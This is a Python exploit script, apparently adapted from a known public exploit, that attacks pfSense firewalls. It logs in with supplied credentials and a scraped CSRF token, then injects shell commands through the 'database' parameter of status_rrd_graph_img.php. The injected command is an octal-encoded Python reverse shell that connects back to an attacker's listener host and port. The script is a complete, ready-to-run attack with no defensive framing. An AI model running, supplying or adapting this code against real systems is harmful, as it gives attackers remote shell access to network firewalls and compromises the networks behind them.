```python
#!/usr/bin/env python3

import argparse
import requests
import urllib3
import collections
import re

# Disable SSL warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

parser = argparse.ArgumentParser()
parser.add_argument("--rhost", help="Remote Host")
parser.add_argument('--lhost', help='Local Host listener')
parser.add_argument('--lport', help='Local Port listener')
parser.add_argument("--username", help="pfsense Username")
parser.add_argument("--password", help="pfsense Password")
args = parser.parse_args()

rhost = args.rhost
lhost = args.lhost
lport = args.lport
username = args.username
password = args.password

# Reverse shell payload
command = """
python -c 'import socket,subprocess,os;
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);
s.connect(("%s",%s));
os.dup2(s.fileno(),0);
os.dup2(s.fileno(),1);
os.dup2(s.fileno(),2);
subprocess.call(["/bin/sh","-i"]);'
""" % (lhost, lport)

# Encode payload in octal
payload = ""
for char in command:
    payload += ("\\" + oct(ord(char)).lstrip("0o"))

login_url = 'https://' + rhost + '/index.php'
exploit_url = "https://" + rhost + "/status_rrd_graph_img.php?database=queues;" + "printf+'" + payload + "'|sh"

headers = collections.OrderedDict([
    ('User-Agent','Mozilla/5.0'),
    ('Accept', 'text/html'),
    ('Connection', 'close'),
    ('Content-Type', 'application/x-www-form-urlencoded')
])

client = requests.session()
client.verify = False  # 🔥 clave

# STEP 1: Obtener página de login
try:
    login_page = client.get(login_url)
except:
    print("Could not connect to host!")
    exit()

# 🔥 FIX CSRF (compatible con comillas simples/dobles)
match = re.search(r'name=[\'"]__csrf_magic[\'"] value=[\'"]([^\'"]+)[\'"]', login_page.text)

if not match:
    print("No CSRF token found!")
    exit()

csrf_token = match.group(1)
print("[+] CSRF token obtained")

# STEP 2: Login
login_data = {
    "__csrf_magic": csrf_token,
    "usernamefld": username,
    "passwordfld": password,
    "login": "Login"
}

login_request = client.post(login_url, data=login_data, headers=headers)

if login_request.status_code == 200:
    print("[+] Login request sent")

    # STEP 3: Ejecutar exploit
    print("[+] Running exploit... (check your listener)")
    try:
        client.get(exploit_url, headers=headers, timeout=5)
        print("[-] Exploit may have failed")
    except:
        print("[+] Exploit sent! If listener is up, you should have a shell.")
else:
    print("[-] Login failed")
```